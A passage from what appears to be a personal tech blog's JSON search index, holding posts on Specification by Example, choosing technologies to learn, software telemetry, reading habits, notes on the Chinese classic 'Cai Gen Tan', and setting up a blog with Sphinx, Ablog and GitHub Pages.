design improves.\nKey process patterns The key process patterns of Specification by Example are:\nDeriving scope from goals Specifying collaboratively Illustrating specifications using examples Refining the specifications Automating validation without changing the specifications Validating the system frequently Evolving living documentation. Deriving scope from goals Feature Injection\nIt’s a popular name for extracting the scope of a project from the business goals. And it is a technique to iteratively derive scope from goals through high-level examples.\nEffect mapping\nA visualization technique for project scope through hierarchical analysis of goals, stakeholders, and features.\nUser story mapping\nA hierarchical mapping technique for user stories that provides a “big picture” view.\nSpecifying collaboratively Everyone in the team should be involved in Specification by Example.\nSpecifying collaboratively is a great way to build a shared understanding of what needs to be done and to ensure that different aspects of a system are covered by the specifications. Collaboration also helps teams produce specifications that are easy to understand and tests that are easy to maintain.\nHave team members review stories early\nWhen: Analysts/domain experts are a bottleneck\nA “cell” consisting of two developers and a tester reviews each story early on to prepare for the meeting with the product owner, identifying any open questions.\nSpecification by Example relies heavily on collaboration between business users and delivery team members. Everyone on the delivery team shares the responsibility for the right specifications. Programmers and testers have to offer input about the technical implementation and the validation aspects. Most teams collaborate on specifications in two phases: Someone works up front to prepare initial examples for a feature, and then those who have a stake in the feature discuss it, adding examples to clarify or complete the specification. The balance between the work done in preparation and the work done during collaboration depends on several factors: the maturity of the product, the level of domain knowledge in the delivery team, typical change request complexity, process bottlenecks, and availability of business users. There are many different ways to collaborate\nMany teams found that, at the start, big workshops were useful as a means to transfer the domain knowledge and align the expectations of developers, testers, and business analysts and stakeholders. But the majority of teams stopped doing big workshops after a while because they discovered that they’re hard to coordinate and cost too much in terms of people’s time.\nAnother approach is to run smaller workshops that involve one developer, one tester, and one business analyst. A popular name for such meetings is Three Amigos.\nOr let someone in the team works on specification alone first. To check if a specification is self-explanatory, get someone else to look at the document and try to understand it, without you saying a word about it.\nCollaborate on defining the language\nWhen: Choosing not to run specification workshops\nIf you decide not to run big workshops and instead use one of the alternative approaches, make sure to collaborate on defining the language.\nIllustrating specifications using examples Examples are a good tool for avoiding communication problems, which is a very effective way to communicate domain knowledge and ensure a shared understanding.\nBecause examples are concrete and unambiguous, they’re an ideal tool for making requirements precise. This is why we use them to clarify meaning in everyday communication, and use them consistently in analysis, development, and testing.\nA specification that defines three key examples properly is much more useful than one that specifies a hundred examples poorly.\nA representative example illustrating each important aspect of business functionality. Business users, analysts, or customers will typically define these. An example illustrating each important technical edge case, such as technical boundary conditions. Developers will typically suggest such examples when they’re concerned about functional gaps or inconsistencies. Business users, analysts, or customers will define the correct expected behavior. An example illustrating each particularly troublesome area of the expected implementation, such as cases that caused bugs in the past and boundary conditions that might not be explicitly illustrated by previous examples. Testers will typically suggest these, and business users, analysts, or customers will define the correct behavior. Avoid using abstract classes of equivalence\nWhen: You can specify a concrete example\nClasses of values have to be translated into something concrete for automation, which means that whoever automates the validations will have to translate the specifications into automation code. This means more opportunities for misunderstanding and misinterpretation. We should have enough examples to describe the entire scope of a feature\nRefining the specifications Collaboration on refining the specification/requirements builds trust between stakeholders and delivery team members.\nAnd collaboration requires preparation\nFor teams who worked on projects where the requirements were vague and required a lot of upfront analysis, the preparation phase started two weeks before the collaborative workshop. This allowed analysts to talk to business users, collect examples from them, and start refining the examples. Teams that had more stable requirements started working on examples a few days before, collecting the obvious open questions and addressing them. All these approaches help to run a bigger workshop more efficiently. Automating validation without changing the specifications Use “Given-When-Then” language in specifications\nIn order to: Make the test easier to understand\nAs a rule of thumb, a specification should declare the context, specify a single action, and then define the expected post-conditions. (Or Arrange-Act-Assert)\nWhen deciding whether to automate the validation of specifications using a technical tool or one for executable specifications, think about which benefits you want to get out of it. If we automate examples with a technical tool, we get easier automation and cheaper maintenance but lose the ability to use them for communication with business users later. We get very good regression tests, but the specifications will be accessible only to developers. Depending on your context, this might or might not be acceptable.\nDon’t check business logic through the user interface\nAutomating just below the skin of the application is a good way to reuse real business flows and avoid duplication in the automation layer. Executing the checks directly using HTTP calls, not through a browser. Speeds up validation significantly and makes it possible to run checks in parallel.\nValidating the system frequently Automate and include validating in the continuous integration process.\nDon’t postpone or delegate automation\nBecause of the automation overhead, some teams delayed it. They described specifications with examples and then wrote code, leaving the automation for later.\nEvolving living documentation Long-term value comes from living documentation\nUse test-driven development as a stepping stone\nWhen: Developers have a good understanding of TDD\nExplain Specification by Example as the process of gathering examples to clarify requirements, deriving tests, and automating them. Our focus is on collaboration and process change rather than tool. Keep executable specifications in a version control system.\nDon’t treat automation code as second-grade code\nWhat typically happens on projects is they put a junior programmer to write the tests and the test system. However, automated test systems are difficult to get right. Junior programmers tend to choose the wrong approximations and build something less reliable. Put your best architects on it. They have the power to say: if we change this in our design, it will make it much better and easier to get tested.\nGood practices Base the specification language on personas\nDocument your building blocks\nIt’s good practice to document the building blocks for specifications; this helps people reuse components and keep the language consistent.\nAvoid making up your own data\nWhen: Data-driven projects Using real data is important on data-driven projects, when a great deal can depend on slight variations and inconsistencies.\nGet precise performance requirements\nWhen: Performance is a key feature\nUse a checklist for discussions\nWhen: Cross-cutting concerns\nA checklist for discussions will ensure that you begin to consider all the important questions when reviewing a story. You can use it to decide which of the cross-cutting concerns apply to a particular story and then focus on illustrating those aspects.\nAvoid writing specifications that are tightly coupled with code\nSpecifications that are tightly coupled with code and closely reflect the software implementation result in tests that are brittle.\nTechnical tests are important, and I’m not arguing against having such tests that are closely coupled with the software design. But such tests should not be mixed with executable specifications. A common mistake for teams starting with Specification by Example is to drop all technical tests, such as the ones at the unit or integration level, and expect that executable specifications will cover all aspects of the system.\nExecutable specifications guide us in delivering the right business functionality. Technical tests ensure that we look at low-level technical quality aspects of the system. We need both, but we should not mix them.\nTechnical test automation tools are much better suited for technical tests than the tools we use to automate executable specifications. They’ll enable the team to maintain such tests much easier.\nTo learn about tools, try a simple project first\nWhen: Working on a legacy system\nAvoid recorded UI tests\nMany traditional test automation tools offer record-and-replay user interface automation. Although this sounds compelling for initial automation, record-and-replay is a terrible choice for Specification by Example. This is one of the areas where automation of executable specifications is quite different than traditional automated regression testing.\nAvoid recording user interface automation if you can. Apart from being almost impossible to understand, recorded scripts are difficult to maintain. They reduce the cost of creating a script but significantly increase the cost of maintenance.\nSpecifications should be described at the business rule level. The automation layer should handle the workflow level by combining blocks composed at the technical activity level. Such tests will be easy to understand, efficient to write, and relatively inexpensive to maintain.\nRefined specifications should be automated with as little change as possible. The automation layer should define how something is tested; specifications should define what is to be tested. Use the automation layer to translate between the business language and user interface concepts, APIs, and databases. Create higher-level reusable components for specifications. Automate below the user interface if possible. Don’t rely too much on existing data if you don’t have to. Validate executable specifications frequently to keep them reliable. Compared to continuous integration with unit tests, the two main challenges for continuous validation are fast feedback and stability. Set up an isolated environment for continuous validation and fully automate deployments to make it more reliable. Look for ways to get faster feedback. Split quick and slow tests, create a pack for current iteration specifications, and divide long-running packs of executable specifications into smaller packs. Don’t just disable failing tests—either fix the problems or move the tests to a pack for low-priority regression issues that’s closely monitored. Organize current work by stories, Reorganize stories by functional areas\nUser stories are excellent as a planning tool, but they aren’t useful as a way to organize existing system functionality.\nWritten by Binwei@Gdynia\n","link":"http://localhost:1313/post/2017/specification_by_example/","section":"post","tags":["booknotes","process"],"title":"Specification by Example"},{"body":"Technology to Learn Next Published: Apr 18, 2017 Tags: career Category: Management\nNowadays, we are in a rapid changing world, and the velocity of the change is increasing. Especially in some young industries like Information technology, new opportunities and exciting news keep popping-up everyday. If you are in IT industry like the me (Binwei, the author), you are lucky. And it is simply too many technologies for you to learn, this blog will discuss the topic: what to learn next.\nTable of Contents Dark side However, there is a dark side of everything in the world, no exception in IT industry.\nObsolescence Let's do some simple comparisons of the front-end technology:\n2000: Flash, ASP, Java Applets 2017: Node.JS, Ruby on Rails, Angular.JS If you are unfortunately pick one of the technology in the first row, what you learned may be not relevant at all after one decade.\nThen you have to learn new stuff in order to catch-up the state-of-art technology.\nThreats The IT industry keeps automating a lot of work by \u0026quot;machine\u0026quot;. At the same time, a lot of programming work is also simplified a lot and automated by \u0026quot;machine\u0026quot;. New frameworks, new tools, new infrastructure and new methodology automates programming work and make it easier to programme too.\nThe entry level in programming becomes lower and lower. Maybe programming will be a skill everyone can have. Think about writing and mathematics 100 years ago, if people had the skills they could depend on them whole life.\nChange, change, change The amount of available knowledge is growing rapidly, the pace of change keeps increasing\nThere are always new tools, new platforms, new languages, new platforms.\nThen let's come back to the original topic, if how you pick up the next book or video to learn new technology, what will be your choice?\nUrgent Needs! Good for my next job It's just cool technology Might help me a decade from now? I promise you will get the answer very soon. :)\nTechnology Adoption Lifecycle First it is simply impossible that you can catch-up all the state-of-art technologies. And there is nothing wrong you decide to wait or skip parts of them.\nEvery technology has its adoption life cycle.\nYou can choose your strategy whether/when to learn a specific technology, and each phase has its pros and cons.\nIf you position yourself on the edge, once there is position you will have strong opportunity to get that with good pay. However the chance may be limited If everybody is learning something popular, it will have the risk of superfluous supply even though the demand may be high. Late entrance may be also good, that you know the techniques are good and not just cool. And the you can get a lot of mature materials and robust infrastructure. From the finance perspective: the \u0026quot;price\u0026quot; of the technology depends on the both demand and supply.\nIf the demand is higher than supply, then it is big opportunity. On the opposite, if the demand is lower than the supply, then it is a threat.\nThen to spend our time on high demand/low supply will be an obvious choice.\nWhat we can do is to keep an eye on overall job market and know the trend:\nJob seeking websites: monster, stackoverflow jobs, dice Technology statistics: TIOBE Index, Bereau of Labor Statistics Technology trend: Tech Radar To know the data/trend is important for you to decide the right direction to go.\nBuild Your Own Foundation The hot skills are changing continuously,\nYou can't know everything You can't keep up with what's new You need to predict potential important skills for next decade, refresh yourself continuously, do not invest all in one skill in order to lower the risks.\nYou have to build your own foundation:\nLearn Learn how to learn Learn what not to learn and where to stop Learn the fundamentals Learning on demand Don't Don't believe marketing hype Don't always follow the money (but always know where it is) Don't let your specialization become your identity Breadth vs Depth Breadth: build a foundation in multiple subject area Depth: briefly specialize in targeted subjects as needed You have your own interests area, your specific personality and your own family situation. The above items vary from people to people, you need to think through them thoroughly and have your own foundation/principle to learn new technology.\nWhen you build your own foundation, then it can help you to drive the process to move forward on learning the new technology and keep updated.\nLearning Tracks If you want to learn new technology, which can be fell into following tracks:\nBuild fundamental knowledge on some areas Get information Build skills Become expert Fundamentals Is widely applicable which is not bound to one particular implementation Rarely becomes obsolete: fundamental knowledge can last a lifetime Can helps you to learn and process information Ensure you spare enough time to build-up solid fundamental knowledge, which will be a very good investment!\nInformation Specific knowledge you use to solve problems When working on an existing project, people mainly will focus on Information part rather than Fundamental part May be bind to a specific tools/technology, are easier to 'fall behind'. Be careful to spend too much energy to purely to build-up information knowledge, after several years they may be outdated.\nSkills The ability to use knowledge to solve problems This part is where you get paid. People rarely pay what you know, they pay what you can do (information vs skills) Practice is essential to build-up skills. Fundamentals and Information are important ingredients to build-up skills too.\nExpertise \u0026amp; Innovation Experts have access to the fundamental knowledge, information and skills that are required to do so.\nTo become competent: study, search for solutions, practice skills\nTo become an expert/innovator: Experimentation, research, perseverance\nPlease be aware that expertise can help you get more work as consultant, speaker or author, but is rarely the most effective way to increase income.\nOne of the reason to choose this track is the innovation track itself can also be a lot of fun.\nAt the meantime, it is also important to keep the balance to become expert in one area vs have wide knowledge.\nHotspots? What will be the next technology hotspots? If you catch-up the hotspots, there will be plenty opportunities for you, high salary, good position, many choices. At the meantime, it is also important you do have interests in that specific technology area.\nRemember: if you are having fun, the money is a bonus!\nThe following areas may have good opportunities to become the next hotspots.\nSecurity \u0026amp; cryptography: there will be more cyberattack, security path can be hot.\n3D printing: can change the model of massive production and emphasize the customization and produce on demand.\nVirtual reality \u0026amp; mixed reality \u0026amp; augmented reality\nHigh performance computation: multiple thread/process, functional programming, distributed computation\nThe internet of things \u0026amp; Big data\nPattern recognition\nArtificial intelligence \u0026amp; Robotics\nBe careful to spend too much energy on all kinds of latest front-end web/mobile/desktop technology. I will assume there will be no difference on programming side between mobile and desktop in the long term. Believe it or not?\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/technology_to_learn_next/","section":"post","tags":["career"],"title":"Technology to Learn Next"},{"body":"Telemetry: Overview Published: Apr 20, 2017 Tags: telemetry Category: ComputerScience\nTelemetry technology plays more and more important role in the 'cloud era'. This blog will explain what is telemetry technology, how we can benefit from telemetry technology, and briefly discuss some technical choices.\nTable of Contents What is Telemetry According to Wikipedia: Telemetry is an automated communications process by which measurements and other data are collected at remote or inaccessible points and transmitted to receiving equipment for monitoring.\nTelemetry technology is heavily used in our life, e.g. monitoring in hospital.\nIn software world, Telemetry plays similar role.\nImaging 20 years ago, most software is still standalone desktop applications and internet is not widely used. It is not straight-forward to know why software goes wrong and how software is used. You had to ask users directly, or asked them to send 'core-dump' to address the software errors.\nNowadays, more and more software is running on web, on mobile devices and in the 'cloud'. We have better position to get telemetry data due to the better infrastructure. There is risk that you will lose the competitive power if your competitors use the telemetry data while you do not.\nTelemetry technology becomes crucial to the software business. You need to understand whether the servers are performing well, whether your software is healthy and how your software is used. The information is critical to your business, and you will find the details in the next chapter.\nUsage of Telemetry In software industry, how we are going to benefit from telemetry technology?\nThe following scenarios are relevant to telemetry technology.\nHealth monitoring We are curious about whether a system is healthy, whether it is running and capable of processing requests.\nAvailability monitoring A truly healthy system requires that the components and subsystems that compose the system are available. Availability monitoring is closely related to health monitoring.\nPerformance monitoring As the system is placed under more and more stress (e.g. by increasing the volume of users), the size of the datasets that these users access grows and the possibility of failure of one or more components becomes more likely. Frequently, component failure is preceded by a decrease in performance. If you're able detect such a decrease, you can take proactive steps to remedy the situation.\nPerformance trending Performance trending chart is useful to show how software performs under stress. To know whether the performance is improved or become worse and identify the hotspots.\nAuto scaling Auto scaling can be a proactive action if performance becomes worse due to increased workload.\nSecurity monitoring All commercial systems that include sensitive data must implement a security structure. You must be prepared to monitor all requests to all resources regardless of the source of these requests.\nFor example:\nA large number of failed sign-in attempts might indicate a brute-force attack. An unexpected surge in requests might be the result of a distributed denial-of-service (DDoS) attack. A system that has a sign-in vulnerability might accidentally expose resources to the outside world without requiring a user to actually sign in. SLA monitoring Many commercial systems that support paying customers make guarantees about the performance of the system in the form of SLAs.\nEssentially, SLAs state that the system can handle a defined volume of work within an agreed time frame and without losing critical information.\nSLA monitoring is concerned with ensuring that the system can meet measurable SLAs.\nAuditing Depending on the nature of the application, there might be statutory or other legal regulations that specify requirements for auditing users' operations and recording all data access.\nAuditing can provide evidence that links customers to specific requests.\nNon-repudiation is an important factor in many e-business systems to help maintain trust be between a customer and the organization that's responsible for the application or service.\nUsage monitoring Usage monitoring tracks how the features and components of an application are used.\nFacilitate decision making Determine which features are heavily used and which are infrequently used. Evaluation can be done on the business value of features, design of the software, and identify potential hotspots in the system.\nThis information can be used for capacity planning as the number of customers grows.\nDetect (possibly indirectly) user satisfaction with the performance or functionality of the system.\nBilling \u0026amp; enforce quota A commercial application or multitenant service might charge customers for the resources that they use.\nIf a user in a multitenant system exceeds their paid quota of processing time or resource usage during a specified period, their access can be limited or processing can be throttled.\nIssue tracking Customers and other users might report issues if unexpected events or behavior occurs in the system.\nIssue tracking is concerned with managing these issues, associating them with efforts to resolve any underlying problems in the system, and informing customers of possible resolutions.\nThe information will help a lot for:\nRoot cause analysis Trouble shooting Technical choices overview There are several technical choices in telemetry. Please be aware the technique is changing rapidly in this area, it is a moving target. You have to refresh the knowledge from time to time to catch up the latest changes.\nMicrosoft Stack Application Insight Very easy to use for web apps, you can get a lot of telemetry data/charts out-of-box. Azure Log Analytics also provides search functionality. Smooth integration to other Microsoft tools, e.g. PowerBI\nHockeyApp Telemetry tool for mobile apps.\nPowerBI Handy tool for dashboard/report/chart.\nElastic Stack Elasticsearch Elasticsearch is on a mission to organize data and make it easily accessible.\nLogstash Logstash is the central dataflow engine in the Elastic Stack for gathering, enriching, and unifying all of your data regardless of format or schema.\nKibana Kibana is a window into the Elastic Stack. It enables visual exploration and real-time analysis of your data in Elasticsearch.\nOther choices Google Analytics\nSplunk\nKeen.io\nCloudWatch\nThis blog is just to introduce the telemetry overview, and there will be follow-up blogs to discuss the technical details.\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/telemetry_overview/","section":"post","tags":["telemetry"],"title":"Telemetry: Overview"},{"body":"How to Read Books Published: Apr 16, 2017 Tags: reading Category: Literature\nI like the following Quota post a lot: When I was a child I ate a lot of food. Most of it is long gone and forgotten, but certainly some of it became my very bones and flesh. Personally I like reading, almost read every day and enjoying reading. This blog post is to share my experience and lessons learned how to improve the reading skills.\nBook types If the purpose of reading is to learn something, mainly books can be categorized into 3 types:\nThe books can help you change your mindset and conceptual pattern (道) The books can let you learn new ways of thinking and consolidate conceptual pattern (术) The books can let you learn new skills and new knowledge (器) Books also vary a lot on quality side.\nSo, we need to distinguish books when reading: some books can be read fast, while others need to be read carefully and repeatedly. You need to make the decision on how to read a book, feel free if you decide to do fast reading for some books.\nYou can learn various reading skills from book: 'How to Read a Book'.\nSome books are only for entertainment purpose. For these books, my suggestion is do whatever you want and just enjoy the reading. :)\nReading challenges and advantages According to 'Cone of Learning' or 'Learning Pyramid', reading has the lowest retention rate after a period of time.\nI shared exactly same experience. After several weeks I can only remember very limited content from books; after 2 years I even cannot remember whether I read a book or not.\nMaybe you will ask question that why we bother reading any more, why cannot choose other more efficient methods directly? E.g. Practicing and Teach others. The followings are the reasons:\nEasy access: good books are easier to access than other resources Flexible time: you can control the time when to read Low restriction: you may encounter much more restriction, no one will stop you from reading So reading still plays a very important role if you want to learn. However we have to learn how to maximize the return of investment (ROI) in reading.\nHow to read better Let me emphasize again, if you can benefit limited from a book, feel free to do fast reading or simply skip it.\nFor some high quality books and you know you can learn a lot from them, the followings are the tips on how to read better.\nResearch during reading When you read, do Google, look into map/wiki to do research, and take notes at the same time. It can help you understand better and deeper.\nFor book notes, considering digital ones. Digital notes (and books) are easier to process later.\nIf you read physical books, don't bother keeping the books clean, just take notes on the books. The value of the books is to help you learn.\nReview and discuss Review the book notes from time to time, which will help you to deepen the understanding.\nTry to tell some one else about what you learned from the book.\nIn order to tell, you have to understand first, organize what you learned into a 'good story', then you need to present it to others. This process will help you understand and remember better of what you learned from the books.\nIf your partner also has read the same book, it will be even better. Or you can recommend some books to your friends and then discuss with them when they finish reading.\nTry to practice Create some opportunities to practice what you have learned from the books, which helps you learn better.\nWrite out After reading, write your understanding out. The format can be a blog containing the most important learning points or a mindmap.\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/how_to_read_books/","section":"post","tags":["reading"],"title":"How to Read Books"},{"body":"","link":"http://localhost:1313/tags/reading/","section":"tags","tags":null,"title":"Reading"},{"body":"Book Notes: Cai Gen Tan Published: Apr 14, 2017 Tags: booknotes, chinese Category: Literature\n'Cai Gen Tan' is an old Chinese book written in Ming dynasty. This book contains the wisdom from Confucianism, Taoists and Buddhism. It is a compact book but providing a lot of life advices.\n《菜根谭》是明朝还初道人洪应明收集编著的一部论述修养、人生、处世、出世的语录集。其文字简炼明隽，兼采雅俗。\n求学 夜眠八尺，日啖二升，何须要有百般计较？书读五车，才分八斗，怎么能得一日清闲？ 学者要收拾精神并归一处。如修德而留意于事功名誉，必无实谊；读书而寄兴于吟咏风雅，定不深心。 做人无甚高远事业，摆脱得俗情便入名流；为学无甚增益功夫，减除得物累便臻圣境。 学者有段兢业的心思，又要有段潇洒的趣味。若一味敛束清苦，是有秋杀无春生，何以发育万物。 明事理 一勺水，便具四海水味，世法不必尽尝；千江月，总是一轮月光，心珠宜当独朗 事理因人言而悟者，有悟还有迷，总不如自悟之了了。意兴从外境而得者，有得还有失，总不如自得之休休。 为善而欲自高胜人，施恩而欲要名结好，修业而欲惊世骇俗，植节而欲标异见奇，此皆是善念中戈矛，理路上荆棘，最易夹带，最难拔除者也。须是涤尽渣滓，斩绝萌芽，才见本来真体。 检点自身 无事便思有闲杂念想否。有事便思有粗浮意气否。得意便思有骄矜辞色否。失意便思有怨望情怀否。时时检点，到得从多入少、从有入无处，才是学问的真消息。 忙处事为，常向闲中先检点，过举自稀。动时念想，预从静里密操持，非心自息 无事常如有事时提防，才可以弥意外之变；有事常如无事时镇定，方可以消局中之危 忙处事为，常向闲中先检点，过举自稀。动时念想，预从静里密操持，非心自息。 戒欲 仕途虽赫奕，常思林下的风味，则权势之念自轻；世途虽纷华，常思泉下的光景，则利欲之心自淡。 优人傅粉调朱，效妍丑于毫端，俄而歌残场罢，妍丑何存？弈者争先竞后，较雌雄于着子，俄而局尽子收，雌雄安在？ 缠脱只在自心,心了则屠肆糟糠居然净土。不然纵一琴一鹤,一花一卉,嗜好虽清,魔障终在。语云:“能休尘境为真境,未了僧家是俗家。” 宠辱不惊 闲看庭前花开花落 去留无意 漫随天外云卷云舒 修身 心体澄澈，常在明镜止水之中，则天下自无可厌之事；意气和平，常在丽日光风之内，则天下自无可恶之人。\n此心常看得圆满 天下自无缺陷之世界 此心常放得宽平 天下自无险侧之人情\n饱后思味，则浓淡之境都消；色后思淫，则男女之见尽绝。故人常以事后之悔悟，破临事之痴迷，则性定而动无不正。\n出世之道，即在涉世中，不必绝人以逃世；了心之功，即在尽心内，不必绝欲以灰心。\n此身常放在闲处，荣辱得失谁能差遣我；此心常安在静中，是非利害谁能瞒昧我。\n纷扰固溺志之场，而枯寂亦槁心之地。故学者当栖心元默，以宁吾真体。亦当适志恬愉，以养吾圆机\n平衡有度 帆只扬五分，船便安。水只注五分，器便稳。如韩信以勇备震主被擒，陆机以才名冠世见杀，霍光败于权势逼君，石崇死于财赋敌国，皆以十分取败者也。康节云﹕\u0026quot;饮酒莫教成酩酊，看花慎勿至离披。\u0026quot;旨哉言乎！\n淡薄之士，必为浓艳者所疑；检饬之人，多为放肆者所忌。君子处此固不可少变其操履，亦不可太露其锋芒。\n忧勤是美德，太苦则无以适性怡情；澹泊是高风，太枯则无以济人利物。\n俭，美德也，过则为悭吝，为鄙啬，反伤雅道；让，懿行也，过则为足恭，为曲谨，多出机心。\n处小人 待小人不难于严 而难于不恶 待君子不难于恭 而难于有礼\n休与小人仇雠，小人自有对头；休向君子谄媚，君子原无私惠。\n不责人小过 不发人隐私 不念人旧恶。三者可以养德 亦可以远害。\n地之秽者多生物，水之清者常无鱼，故君子当存含垢纳污之量，不可持好洁独行之操。\n鹩占一枝,反笑鹏心奢侈;兔营三窟,转嗤鹤垒高危。智小者不可以谋大,趣卑者不可与谈高。\n处事 兢逐听人，而不嫌盡醉，恬憺適己，而不夸獨醒，此釋氏所謂“不為法纏、不為空纏，身心兩自在\n家人有过，不宜暴怒，不宜轻弃。此事难言，借他事隐讽之；今日不悟，俟来日再警之。如春风解冻，如和气消冰，才是家庭的型范。\n鹤立鸡群，可谓超然无侣矣。然进而观于大海之鹏，则眇然自小。又进而求之九霄之凤，则巍乎莫及。所以至人常若无若虚，而盛德多不矜不伐也\n进步处便思退步，庶免触藩之祸；著手时先图放手，才脱骑虎之危。\n恩宜自淡而浓 先浓后淡者 人忘其惠 威宜自严而宽 先宽后严者 人怨其酷。\n毋因群疑而阻独见，毋任己意而废人言，毋私小惠而伤大体，毋借公论以快私情\n克制 士君子之涉世，於人不可轻为喜怒，喜怒轻，则心腹肝胆皆为人所窥；於物不可重为爱憎，爱憎重，则意气精神悉为物所制。\n花开花谢春不管，拂意事休对人言；水暖水寒鱼自知，会心处还期独赏。\n从热闹场中出几句清冷言语，便扫除无限杀机；向寒微路上用一点赤热心肠，自培植许多生意。\n不可乘喜而輕諾，不可因醉而生嗔，不可乘快而多事，不可因倦而鮮終。\n人生哲学 大聰明的人，小事必朦朧；大懵懂的人，小事必伺察。蓋伺察乃懵懂之根，而朦朧正聰明之窟也。\n真廉无廉名，立名者所以为贪；大巧无巧术，用术者所以为拙。\n思入世而有为者，须先领得世外风光，否则无以脱垢浊之尘缘；思出世而无染者，须先谙尽世中滋味。否则无以持空寂之后苦趣。\n钓水，逸事也，尚持生杀之柄；弈棋，清戏也，且动战争之心。可见喜事不如省事之为适，多能不如无能之全真。\n为恶而畏人知，恶中犹有善路；为善而急人知，善处即是恶根。\n","link":"http://localhost:1313/post/2017/book-cai_gen_tan/","section":"post","tags":["booknotes","chinese"],"title":"Cai Gen Tan"},{"body":"","link":"http://localhost:1313/tags/blog/","section":"tags","tags":null,"title":"Blog"},{"body":"","link":"http://localhost:1313/tags/opensource/","section":"tags","tags":null,"title":"Opensource"},{"body":"Setup Blog: Using Sphinx and Ablog Published: Apr 12, 2017 Tags: blog, opensource Category: ComputerScience\nWriting blogs is a good way to learn. The brain of human being has retention rate of what is learned. In order to learn efficiently, people need to be more active on discussing, practicing and teaching. No matter your blog has already got millions of followers or not, the blog writing itself is very beneficial for yourself to learn better. This blog post will teach you how to setup your personal blog by using open source technology like Sphinx and Ablog.\nTable of Contents Why DIY? Nowadays, there are many free blog sites you can choose like Wordpress, Blogger, Ghost. Users can get a lot of nice features out of box, and write good look and feel blogs. Then why bother doing it yourself?\nThe followings are the main reasons for the DIY approach:\nYou have the full control of the blog source files which reduces the risks if sites are closed or change the pricing model Easier to maintain the blog content You have more flexibility to customize your blog site DIY itself has a lot of fun! I am not saying DIY is a better way. There are pros/cons of both choices, it is mainly your personal preference.\nSphinx, Ablog and Github Pages To setup blog sites yourselves has many ways, on theory you can write all the pages from scratch. It will make the life easier if you consider using existing tools. In this post, several open source tools like Sphinx, Ablog will be used. And we will use Github Pages to hold the blog sites.\nSphinx Sphinx is from Python community and makes it easy to create beautiful documentation. http://www.sphinx-doc.org/\nSphinx uses reStructuredText as its markup language, which has good readability and easy to maintain.\nAblog Ablog is a Sphinx extension which helps to setup blog site efficiently. http://ablog.readthedocs.io/\nGithub Pages Github Pages is a product of Github ecosystem, which is a website for you and your projects. The advantage of Github Pages is that it is hosted directly from Github repository. It makes all our blog source files under source control! https://pages.github.com/\nLet's start building our blog site~~~\nInstallation Python Python installation if the first step, go to: https://www.python.org/\nInstall latest Python 3.x, which contains the handy utilities like pip.\nYou can verify the installation by starting a console app and type python. If everything goes right, you will get output like following:\n1Python 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32 2Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. 3\u0026gt;\u0026gt;\u0026gt; You can see the version 3.6.1 on my computer. Ctrl + Z to exit the python.\nSphinx and Ablog Ablog installation will cover the Sphinx. Go to your console app again and type:\n1pip install -U ablog It will install all the relevant tools like Sphinx, Alabaster, Werkzeug etc.\nYou can verify the installation simply by typing ablog in the console app. If everything goes well, you will see the output from ablog.\nGithub Pages You need a github account. You have it, right? :)\nCreate a new repository which has the name: [username].github.io. This repository will be the place to host your blog sites.\nI recommend you to create a separate repository in github to host your blog source files - Sphinx files in this case.\nFor this blog sites, you can find the blog site repository: https://github.com/wubw/wubw.github.io\nAnd the blog source files repository: https://github.com/wubw/BinweiBlog\nPost and Deploy Assuming that you have created two github repositories as mentioned above:\nOne for blog site One for blog source file Open console app, and switch to blog source file repository. Run ablog start command to setup the current directory as ablog repository.\nSeveral examples blog source files are created, which have Sphinx file extension: .rst\nRun ablog build to build the repository. The build process is to generate html/javascript/css files from your source files (.rst).\nRun ablog serve to view the blog site locally. If everything goes well, you are supposed to see the blog pop-up in your web browser.\nRun ablog post + filename.rst to add a new blog post.\nconf.py in the root of repository is the configuration file, you can change the theme and customize your blog site in it.\nRun ablog deploy to deploy the blog to the destination github repository. You need to add github_pages configuration into conf.py. I encounter some deployment challenges in my Windows operating system, will explain how I resolve it in Notes_ section.\nThis blog site is using exactly the same tools, so you can expect to see the similar result for your own blog site.\nNotes You may encounter some mysterious errors since ablog is still under construction. In this section, I just share some important notes from my point of view.\nablog build error When I run ablog build first on my computer, I encounter the following error:\n1Traceback (most recent call last): 2 File \u0026#34;C:\\Users\\wubw\\AppData\\Local\\Programs\\Python\\Python36-32\\Scripts\\ablog-script.py\u0026#34;, line 11, in \u0026lt;module\u0026gt; 3 load_entry_point(\u0026#39;ablog==0.8.4\u0026#39;, \u0026#39;console_scripts\u0026#39;, \u0026#39;ablog\u0026#39;)() 4 File \u0026#34;c:\\users\\wubw\\appdata\\local\\programs\\python\\python36-32\\lib\\site-packages\\ablog\\commands.py\u0026#34;, line 404, in ablog_main 5 namespace.func(**namespace.__dict__) 6 File \u0026#34;c:\\users\\wubw\\appdata\\local\\programs\\python\\python36-32\\lib\\site-packages\\ablog\\commands.py\u0026#34;, line 119, in ablog_build 7 confdir = find_confdir() 8 File \u0026#34;c:\\users\\wubw\\appdata\\local\\programs\\python\\python36-32\\lib\\site-packages\\ablog\\commands.py\u0026#34;, line 22, in find_confdir 9 if isfile(conf) and \u0026#39;ablog\u0026#39; in open(conf).read(): 10 File \u0026#34;c:\\users\\wubw\\appdata\\local\\programs\\python\\python36-32\\lib\\encodings\\cp1252.py\u0026#34;, line 23, in decode 11 return codecs.charmap_decode(input,self.errors,decoding_table)[0] 12UnicodeDecodeError: \u0026#39;charmap\u0026#39; codec can\u0026#39;t decode byte 0x9d in position 583: character maps to \u0026lt;undefined\u0026gt; It is an encoding issue in the ablog library, open the commands.py mentioned in the error message and go to the error line. The fix is to add encoding parameter:\n1if isfile(conf) and \u0026#39;ablog\u0026#39; in open(conf, encoding=\u0026#34;utf8\u0026#34;).read(): 2 return confdir In Linux/Mac and some Windows OS, the build process may complain about fail to create a _website/blog. Manually create it should bypass the issue.\nablog deploy error When I run ablog deploy on Windows 10, it fails due to some mysterious errors. But when I run the same command on Mac and Ubuntu, I manage to deploy the blog to the target repository.\nCurrently, I cannot figure out what is the root course of the error. Then the workaround is to deploy from Mac or Ubuntu, or setup some virtual machines?\nChinese blog issue When my blog contains Chinese characters, I encounter mysterious errors in atom feed generation. After some investigation, the error disappears if excerpt does not contain Chinese characters.\nEnhance the blog You can enhance/customize your blog, e.g. 